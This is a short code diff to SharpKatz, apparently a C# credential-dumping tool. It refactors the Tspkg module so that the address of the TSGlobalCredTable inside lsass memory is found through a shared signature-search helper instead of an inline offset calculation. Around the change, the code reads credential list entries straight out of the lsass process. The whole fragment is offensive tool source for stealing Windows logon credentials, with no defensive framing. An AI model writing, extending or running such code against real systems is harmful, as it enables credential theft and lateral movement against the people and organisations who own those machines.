@@ -78,7 +78,7 @@ namespace SharpKatz.Module
             IntPtr tsGlobalCredTableAddr;
             IntPtr tspkgLocal;
             IntPtr llCurrent;
-
+            /*
             // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
             tspkgLocal = Natives.LoadLibrary("tspkg.dll");
             if (tspkgLocal == IntPtr.Zero)
@@ -109,10 +109,12 @@ namespace SharpKatz.Module
             tmp_p = IntPtr.Add(tspkgMem, (int)tsGlobalCredTableSignOffset + oshelper.TSGlobalCredTableOffset + sizeof(int) + (int)tsGlobalCredTableOffset);
             byte[] tsGlobalCredTableAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
             tsGlobalCredTableAddr = new IntPtr(BitConverter.ToInt64(tsGlobalCredTableAddrBytes, 0));
+            */
+            tsGlobalCredTableAddr = Utility.GetListAdress(hLsass, tspkgMem, "tspkg.dll", max_search_size, oshelper.TSGlobalCredTableOffset, oshelper.TSGlobalCredTableSign);
 
             //Console.WriteLine("[*] Tspkg TSGlobalCredTable found at address {0:X}", tsGlobalCredTableAddr.ToInt64());
 
-            if(tsGlobalCredTableAddr != IntPtr.Zero)
+            if (tsGlobalCredTableAddr != IntPtr.Zero)
             {
                 // Read first entry from linked list
                 byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, tsGlobalCredTableAddr, Convert.ToUInt64(sizeof(RTL_AVL_TABLE)));
